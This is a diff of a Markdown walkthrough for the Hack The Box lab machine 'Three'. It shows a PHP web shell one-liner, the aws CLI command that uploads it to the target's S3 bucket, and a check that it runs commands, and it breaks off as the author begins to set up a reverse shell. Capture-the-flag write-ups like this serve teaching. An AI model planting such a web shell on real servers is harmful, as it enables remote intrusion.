@@ -57,8 +57,8 @@ the webroot directory we can visit this webpage in the browser, which will, in t
 will achieve remote code execution.
 
 
-We can use the following PHP one-liner which uses the system() function which takes the URL parameter
-cmd as an input and executes it as a system command.
+_We can use the following PHP one-liner which uses the system() function which takes the URL parameter
+cmd as an input and executes it as a system command
 
 **<?php system($_GET["cmd"]); ?>**
 
@@ -69,8 +69,20 @@ then make file php
 Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command
 
 
+**aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb**
 
+![](/Assets/HTB/THREE/assets/result.png)
 
+_We can confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php. Let us try
+executing the OS command id using the URL parameter **cmd**_
+
+![](/Assets/HTB/THREE/assets/id.png)
+
+_The response from the server contains the output of the OS command id , which verified that we have code
+execution on the box. Thus, let us now try to obtain a reverse shell.
+Through a reverse shell, we will trigger the remote host to connect back to our local machine's IP address on
+the specified listening port. We can obtain the tun0 IP address of our local machine using the following
+command._
 
 
 
